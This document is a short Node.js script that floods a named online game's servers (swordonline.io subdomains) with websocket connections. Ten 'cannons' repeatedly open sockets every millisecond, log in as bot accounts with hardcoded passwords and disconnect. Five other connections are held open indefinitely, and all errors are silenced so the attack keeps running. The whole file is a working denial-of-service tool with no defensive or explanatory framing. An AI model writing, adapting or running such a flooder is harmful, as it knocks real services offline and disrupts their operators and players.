const io = require("socket.io-client");

const target = process.argv[2];
const ACCOUNTS = 40;
const CANNONS = 10;
const FIRE_DELAY = 1; // faster firing
const SOCKET_LIFETIME = 1; // longer hold time

console.clear();
console.log(`Target: ${target} | Cannons: ${CANNONS}`);

let connected = 0;

for (let i = 0; i < CANNONS; i++) {
  const sock = io(`https://${target}.swordonline.io`, {
    transports: ["websocket"],
    reconnection: false,
  });

  sock.on("connect", () => {
    connected++;
    if (connected === CANNONS) {
      console.log(`All ${CANNONS} cannons loaded for ${target}`);
      setTimeout(() => {
        console.log(`Firing cannons at ${target}...`);
        for (let j = 0; j < CANNONS; j++) {
          if (j < 5) {
            // Keep a few connected bots alive forever
            holdBot(target);
          } else {
            setTimeout(() => {
              setInterval(() => fireOnce(target), FIRE_DELAY);
            }, j * 10); // heavily staggered
          }
        }
      }, 1);
    }
  });

  sock.on("disconnect", () => {});
}

function fireOnce(target) {
  try {
    const id = Math.floor(Math.random() * ACCOUNTS) + 1;
    const sock = io(`https://${target}.swordonline.io`, {
      transports: ["websocket"],
      reconnection: false,
    });

    sock.on("connect", () => {
      sock.emit("login", {
        email: `Lib_Bot #${id}`,
        password: "Password1234",
      });
      setTimeout(() => {
        try {
          sock.disconnect();
        } catch {}
      }, SOCKET_LIFETIME);
    });
  } catch {}
}

function holdBot(target) {
  try {
    const id = Math.floor(Math.random() * ACCOUNTS) + 1;
    const sock = io(`https://${target}.swordonline.io`, {
      transports: ["websocket"],
      reconnection: false,
    });

    sock.on("connect", () => {
      sock.emit("login", {
        email: `Lib_Bot #${id}`,
        password: "Password123",
      });
      // stays connected
    });
  } catch {}
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
